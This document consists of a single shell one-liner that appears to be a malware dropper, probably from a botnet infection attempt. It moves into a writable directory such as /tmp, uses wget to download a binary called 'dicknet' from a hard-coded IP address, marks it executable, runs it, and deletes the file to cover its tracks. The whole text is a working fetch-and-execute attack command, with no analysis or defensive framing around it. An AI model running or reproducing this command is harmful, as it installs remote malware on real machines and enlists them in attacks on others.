cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.85.39.116/dicknet; chmod +x dicknet; ./dicknet; rm -rf dicknet
